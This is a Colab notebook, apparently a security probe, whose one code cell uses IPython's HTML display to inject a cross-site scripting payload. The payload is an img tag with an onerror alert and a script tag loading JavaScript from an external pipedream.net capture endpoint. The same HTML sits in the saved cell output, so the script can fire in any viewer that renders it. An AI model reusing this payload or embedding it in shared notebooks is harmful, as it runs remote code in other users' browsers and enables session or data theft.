{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "test.ipynb",
      "provenance": [],
      "authorship_tag": "ABX9TyMZQfPku7e1zZMZGjcgvXxt",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/mflzkejxmglkzjefmlkgjzmlefxjkg/test/blob/master/test8.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "6YbH8k5IJ1s_",
        "colab_type": "code",
        "outputId": "7abcd5aa-1427-4d26-ea8a-4905cf932d20",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 36
        }
      },
      "source": [
        "from IPython.core.display import display, HTML\n",
        "\n",
        "display(HTML('''\n",
        "<img src=https://127.0.0.1 onerror=alert(2)></img>\n",
        "<script type=\"text/javascript\" src=\"https://en9qxsf2m7r9f.x.pipedream.net/t.js\"></script>\n",
        "'''))"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "\n",
              "<img src=https://127.0.0.1 onerror=alert(2)></img>\n",
              "<script type=\"text/javascript\" src=\"https://en9qxsf2m7r9f.x.pipedream.net/t.js\"></script>\n"
            ],
            "text/plain": [
              "<IPython.core.display.HTML object>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    }
  ]
}